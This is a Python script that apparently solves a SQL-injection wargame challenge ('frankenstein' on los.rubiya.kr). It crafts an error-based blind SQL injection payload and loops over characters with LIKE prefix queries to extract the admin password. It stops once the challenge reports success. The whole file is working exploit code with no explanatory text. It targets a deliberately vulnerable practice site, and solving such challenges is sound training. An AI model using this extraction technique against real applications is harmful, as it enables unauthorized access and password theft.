import urllib.parse

from constants import *

chall_url = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php"


def query(query_part):
    return "?pw=" + urllib.parse.quote(f"' or id='admin' and case when {query_part} then 1 else {error_condition} end#")


def check_query(res):
    return not res.endswith("error")


pw_len = None
prefix = ""


def find_char(prefix):
    for c in digits_and_lower_case_letters:
        res = make_request(chall_url, query(f"pw like '{prefix + c}%'"))
        if check_query(res):
            print("Found prefix", prefix + c)
            return prefix + c
    print("did not find char")


prefix = ""

if prefix != "":
    res = make_request(chall_url, query(f"pw like '{prefix}'"))
    print(check_query(res))

max_len = 64
while len(prefix) < max_len:
    prefix = find_char(prefix)
    res = make_request(chall_url, f"?pw={prefix}")
    if check_clear(res, noPrint=True):
        check_clear(res)
        exit()
    assert prefix
